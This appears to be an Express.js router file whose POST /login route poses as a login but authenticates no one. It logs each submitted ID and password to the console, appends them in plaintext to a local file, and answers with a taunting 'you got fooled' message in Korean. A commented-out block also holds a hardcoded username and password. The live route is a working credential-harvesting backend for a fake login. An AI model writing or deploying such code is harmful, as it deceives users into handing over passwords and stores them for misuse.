var express = require('express');
var fs = require('fs');
var router = express.Router();

/* GET users listing. */
router.get('/', function (req, res, next) {
  res.send('respond with a resource');
});


router.post('/login', function (req, res, next) {
  /*if(req.body.ID=='neverdie1219'){
    if(req.body.PW=='qweqwe12'){
      res.send('login 성공');
    }

    else{
      res.send('login 실패');
    }
  }

  else {
    res.send('ID를 찾을 수 없음')
  }*/

  console.log('입력된 ID: ', req.body.ID);
  console.log('입력된 PW: ', req.body.PW);

  var data = '아이디: '+req.body.ID+' / 비번: '+req.body.PW+"\n"+"-------------------------------"+"\n";
  console.log(data);

  fs.appendFile('aaa.txt', data, 'utf8', function (error, data) {
    if (error) { throw error };
    console.log('성공');
  })

  res.send('앙 속았띠ㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋ');
});

module.exports = router;
